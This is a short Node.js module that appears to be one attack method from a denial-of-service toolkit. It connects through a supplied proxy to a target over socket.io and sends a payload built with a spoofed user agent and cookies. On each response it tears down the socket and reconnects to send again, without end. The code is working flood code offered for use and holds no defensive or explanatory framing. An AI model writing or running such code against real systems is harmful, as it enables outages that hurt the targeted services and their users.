const proxy = require('socket.io-proxy');


async function fukthis(args, host, port, payload){
    proxy.init('http://' + host + ":" + port);
    let socket = proxy.connect(args.target);

    socket.on('connect', function () {
        socket.write(payload);
        socket.on('data', function (data) {
            socket.destroy();
            return fukthis(args, host, port, payload);
        });
        socket.on('disconnect', function() {
        });
    });
}

function start(args, proxy, ua, secondcookies){
    fukthis(args, proxy.split(":")[0], proxy.split(":")[1], require('./payloads/socket.js')(args, proxy, ua, secondcookies))
}

module.exports = start;